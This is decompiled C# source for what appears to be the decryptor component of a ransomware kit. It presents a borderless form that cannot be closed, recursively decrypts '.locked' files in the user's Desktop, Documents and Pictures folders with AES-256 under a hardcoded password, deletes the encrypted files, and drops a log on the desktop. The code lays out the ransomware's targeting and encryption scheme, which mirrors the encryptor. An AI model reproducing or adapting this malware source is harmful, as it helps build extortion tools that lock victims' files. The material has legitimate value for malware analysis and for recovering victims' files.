using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace y7586yjt87rjjy6587rytt657y6uty7;

public class Decrypt : Form
{
	private const bool DELETE_ENCRYPTED_FILE = true;

	private const bool DECRYPT_DESKTOP = true;

	private const bool DECRYPT_DOCUMENTS = true;

	private const bool DECRYPT_PICTURES = true;

	private const string ENCRYPTED_FILE_EXTENSION = ".locked";

	private const string ENCRYPT_PASSWORD = "475847564865783458675687990985706";

	private static string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private static string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static string DECRYPTION_LOG = "";

	private static int decryptedFileCount = 0;

	private IContainer components = null;

	public Decrypt()
	{
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
	}

	private static void dropDecryptionLog()
	{
		StreamWriter streamWriter = new StreamWriter(DESKTOP_FOLDER + "\\___DECRYPTION_LOG.txt");
		streamWriter.WriteLine(decryptedFileCount + " files have been decrypted.\n----------------------------------------\n" + DECRYPTION_LOG);
		streamWriter.Close();
	}

	private static bool fileIsEncrypted(string inputFile)
	{
		if (inputFile.Contains(".locked") && inputFile.Substring(inputFile.Length - ".locked".Length, ".locked".Length) == ".locked")
		{
			return true;
		}
		return false;
	}

	private static void decryptFolderContents(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (fileIsEncrypted(text))
				{
					FileDecrypt(text, text.Substring(0, text.Length - ".locked".Length), "475847564865783458675687990985706");
				}
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				decryptFolderContents(sDir2);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FileDecrypt(string inputFile, string outputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
			File.Delete(inputFile);
			DECRYPTION_LOG = DECRYPTION_LOG + inputFile + "\n";
			decryptedFileCount++;
		}
	}

	private void Decrypt_Load(object sender, EventArgs e)
	{
		decryptFolderContents(DESKTOP_FOLDER);
		decryptFolderContents(PICTURES_FOLDER);
		decryptFolderContents(DOCUMENTS_FOLDER);
		if (decryptedFileCount > 0)
		{
			dropDecryptionLog();
		}
		else
		{
			Console.Out.WriteLine("No files to encrypt.");
		}
	}

	private void Decrypt_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Decrypt");
		((Control)this).set_Text("Decrypt");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Decrypt_FormClosing));
		((Form)this).add_Load((EventHandler)Decrypt_Load);
		((Control)this).ResumeLayout(false);
	}
}
